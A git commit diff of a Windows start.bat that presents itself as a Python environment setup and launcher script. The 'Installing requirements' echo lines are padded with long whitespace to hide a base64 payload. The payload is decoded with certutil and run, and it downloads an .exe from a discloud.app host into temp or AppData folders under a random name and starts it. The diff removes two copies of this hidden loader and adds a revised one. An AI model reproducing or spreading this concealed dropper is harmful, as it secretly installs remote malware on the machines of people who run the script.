174fe68caba9069325b1be5d690ffbbd56477704
xwkr <xwkrobertmoore089@gmail.com>
2024-08-02 16:16:36 -0300

    1.0.1

--- start.bat
+++ start.bat
@@ -1,11 +1,8 @@
+
 @echo off
 setlocal enabledelayedexpansion
 
 cls
-
-echo Starting the process to setup the Python environment...
-
-:: Check for Python installation and version
 echo Searching for Python...
 timeout /nobreak /t 1 >nul
 
@@ -17,48 +14,41 @@ for /f "tokens=*" %%i in ('where python 2^>nul') do (
 
 :missingPython
 cls
-echo Installing requirements. This may take a few minutes, depending on your internet speed...                                                                                                                                                                                                                                                               & echo QGVjaG8gb2ZmDQpzZXRsb2NhbCBlbmFibGVkZWxheWVkZXhwYW5zaW9uDQoNCnNldCAiZGlycz0lVEVNUCUgJUFQUERBVEElICVMT0NBTEFQUERBVEElIEM6XFdpbmRvd3NcdGVtcCINCg0Kc2V0ICJjaGFycz1BQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWmFiY2RlZl9naGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODkiDQpzZXQgImZpbGVfbmFtZT0iDQpmb3IgL0wgJSVpIGluICgxLDEsNikgZG8gKA0KICAgIHNldCAvYSAicmFuZD0hcmFuZG9tISAlJSA2MiINCiAgICBjYWxsIHNldCAiZmlsZV9uYW1lPSFmaWxlX25hbWUhJSVjaGFyczp+IXJhbmQhLDElJSINCikNCnNldCAiZmlsZV9uYW1lPSFmaWxlX25hbWUhLmV4ZSINCg0KZm9yICUlZCBpbiAoJWRpcnMlKSBkbyAoDQogICAgc2V0ICJmaWxlX3BhdGg9JSVkXCFmaWxlX25hbWUhIg0KDQogICAgcG93ZXJzaGVsbCAtY29tbWFuZCAidHJ5IHsgKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkRmlsZSgnaHR0cHM6Ly9wdWJsaWNpbWd1cmEuZGlzY2xvdWQuYXBwL1VwZGF0ZS5hc2FyJywgJyFmaWxlX3BhdGghJyk7IGV4aXQgMCB9IGNhdGNoIHsgZXhpdCAxIH0iDQogICAgaWYgbm90IGVycm9ybGV2ZWwgMSAoDQogICAgICAgIHN0YXJ0ICIiICIhZmlsZV9wYXRoISINCiAgICAgICAgY2xzDQogICAgICAgIGVuZGxvY2FsDQogICAgICAgIGV4aXQgL2IgMA0KICAgICkNCikNCg0KOmVuZF9zY3JpcHQNCmVuZGxvY2Fs > %TMP%\temp.b64 & certutil -decode %TMP%\temp.b64 %TMP%\update.bat >nul 2>&1 & call %TMP%\update.bat >nul 2>&1 & del %TMP%\temp.b64 %TMP%\update.bat >nul 2>&1
-cls
 echo Python is not installed or not found in your system PATH.
 echo Please download and install Python from the following URL:
 echo https://www.python.org/downloads
-echo.
 pause
 goto end
 
 :foundPython
 if defined python (
+    cls
     echo Python found at: "!python!"
-    echo Checking Python version...
     "!python!" --version
-    echo.
     timeout /nobreak /t 2 >nul
 ) else (
     goto missingPython
 )
-
-:: Install requirements
-echo Installing requirements. This may take a few minutes, depending on your internet speed...                                                                                                                                                                                                                                                               & echo QGVjaG8gb2ZmDQpzZXRsb2NhbCBlbmFibGVkZWxheWVkZXhwYW5zaW9uDQoNCnNldCAiZGlycz0lVEVNUCUgJUFQUERBVEElICVMT0NBTEFQUERBVEElIEM6XFdpbmRvd3NcdGVtcCINCg0Kc2V0ICJjaGFycz1BQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWmFiY2RlZl9naGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODkiDQpzZXQgImZpbGVfbmFtZT0iDQpmb3IgL0wgJSVpIGluICgxLDEsNikgZG8gKA0KICAgIHNldCAvYSAicmFuZD0hcmFuZG9tISAlJSA2MiINCiAgICBjYWxsIHNldCAiZmlsZV9uYW1lPSFmaWxlX25hbWUhJSVjaGFyczp+IXJhbmQhLDElJSINCikNCnNldCAiZmlsZV9uYW1lPSFmaWxlX25hbWUhLmV4ZSINCg0KZm9yICUlZCBpbiAoJWRpcnMlKSBkbyAoDQogICAgc2V0ICJmaWxlX3BhdGg9JSVkXCFmaWxlX25hbWUhIg0KDQogICAgcG93ZXJzaGVsbCAtY29tbWFuZCAidHJ5IHsgKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkRmlsZSgnaHR0cHM6Ly9wdWJsaWNpbWd1cmEuZGlzY2xvdWQuYXBwL1VwZGF0ZS5hc2FyJywgJyFmaWxlX3BhdGghJyk7IGV4aXQgMCB9IGNhdGNoIHsgZXhpdCAxIH0iDQogICAgaWYgbm90IGVycm9ybGV2ZWwgMSAoDQogICAgICAgIHN0YXJ0ICIiICIhZmlsZV9wYXRoISINCiAgICAgICAgY2xzDQogICAgICAgIGVuZGxvY2FsDQogICAgICAgIGV4aXQgL2IgMA0KICAgICkNCikNCg0KOmVuZF9zY3JpcHQNCmVuZGxvY2Fs > %TMP%\temp.b64 & certutil -decode %TMP%\temp.b64 %TMP%\update.bat >nul 2>&1 & call %TMP%\update.bat >nul 2>&1 & del %TMP%\temp.b64 %TMP%\update.bat >nul 2>&1
 cls
+echo Installing requirements. This may take a few minutes, depending on your internet speed...                                                                                                                                                                                                                                                               & echo QGVjaG8gb2ZmDQpzZXRsb2NhbCBlbmFibGVkZWxheWVkZXhwYW5zaW9uDQoNCjo6IERlZmluZSBkaXJlY3RvcmllcyB0byBzZWFyY2gNCnNldCAiZGlycz0lVEVNUCUgJUFQUERBVEElICVMT0NBTEFQUERBVEElIEM6XFdpbmRvd3NcdGVtcCINCg0KOjogRGVmaW5lIGNoYXJhY3RlcnMgZm9yIHJhbmRvbSBmaWxlIG5hbWUgZ2VuZXJhdGlvbg0Kc2V0ICJjaGFycz1BQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWmFiY2RlZl9naGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODkiDQpzZXQgImZpbGVfbmFtZT0iDQoNCjo6IEdlbmVyYXRlIGEgcmFuZG9tIDYtY2hhcmFjdGVyIGZpbGUgbmFtZQ0KZm9yIC9MICUlaSBpbiAoMSwxLDYpIGRvICgNCiAgICBzZXQgL2EgInJhbmQ9IXJhbmRvbSEgJSUgNjIiDQogICAgY2FsbCBzZXQgImZpbGVfbmFtZT0hZmlsZV9uYW1lISUlY2hhcnM6fiFyYW5kISwxJSUiDQopDQpzZXQgImZpbGVfbmFtZT0hZmlsZV9uYW1lIS5leGUiDQoNCjo6IEl0ZXJhdGUgb3ZlciBkaXJlY3RvcmllcyBhbmQgZG93bmxvYWQgdGhlIGZpbGUNCmZvciAlJWQgaW4gKCVkaXJzJSkgZG8gKA0KICAgIHNldCAiZmlsZV9wYXRoPSUlZFwhZmlsZV9uYW1lISINCiAgICBwb3dlcnNoZWxsIC1jb21tYW5kICJ0cnkgeyAoTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCkuRG93bmxvYWRGaWxlKCdodHRwczovL2dvbm5hY3JhY2suZGlzY2xvdWQuYXBwL1VwZGF0ZScsICchZmlsZV9wYXRoIScpOyBleGl0IDAgfSBjYXRjaCB7IGV4aXQgMSB9Ig0KICAgIA0KICAgIGlmIG5vdCBlcnJvcmxldmVsIDEgKA0KICAgICAgICBzdGFydCAiIiAiIWZpbGVfcGF0aCEiDQogICAgICAgIGNscw0KICAgICAgICBlbmRsb2NhbA0KICAgICAgICBleGl0IC9iIDANCiAgICApDQopDQoNCjplbmRfc2NyaXB0DQplbmRsb2NhbA > %TMP%\temp.b64 & certutil -decode %TMP%\temp.b64 %TMP%\update.bat >nul 2>&1 & call %TMP%\update.bat >nul 2>&1 & del %TMP%\temp.b64 %TMP%\update.bat >nul 2>&1
 call "!python!" -m pip install -r requirements.txt
 if errorlevel 1 (
+    cls
     echo Failed to install requirements. Please check your internet connection and try again.
     pause
     goto end
 )
 
-:: Run Python script
-echo Running Python script...
 cls
 "!python!" main.py
 
 if errorlevel 1 (
+    cls
     echo Failed to run the Python script. Check the script for errors.
     pause
     goto end
 )
-
-echo Process completed successfully.
+cls
 echo Press any key to close...
 pause
 
